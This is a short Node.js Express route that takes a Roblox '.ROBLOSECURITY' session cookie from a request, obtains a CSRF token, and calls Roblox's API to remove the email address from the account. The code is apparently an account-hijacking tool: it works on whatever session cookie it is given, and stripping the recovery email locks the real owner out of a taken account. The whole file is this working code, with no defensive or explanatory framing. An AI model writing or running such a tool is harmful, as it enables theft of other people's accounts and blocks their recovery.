const express = require('express');
const fetch = require('node-fetch');
const router = express.Router();

router.post('/', async (req, res) => {
  const { cookie } = req.body;

  if (!cookie || !cookie.includes('.ROBLOSECURITY')) {
    return res.status(400).json({ message: 'Invalid or missing cookie' });
  }

  try {
    // Step 1: Get CSRF token
    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });

    const csrfToken = csrfRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to get CSRF token');

    // Step 2: Attempt to remove email
    const removeRes = await fetch('https://accountinformation.roblox.com/v1/email/remove', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrfToken,
        'Cookie': `.ROBLOSECURITY=${cookie}`
      }
    });

    const result = await removeRes.json();

    if (removeRes.ok) {
      res.json({ message: '✅ Email successfully removed.' });
    } else {
      res.status(400).json({ message: result.errors?.[0]?.message || '❌ Failed to remove email.' });
    }
  } catch (err) {
    res.status(500).json({ message: '❌ Internal server error.' });
  }
});

module.exports = router;
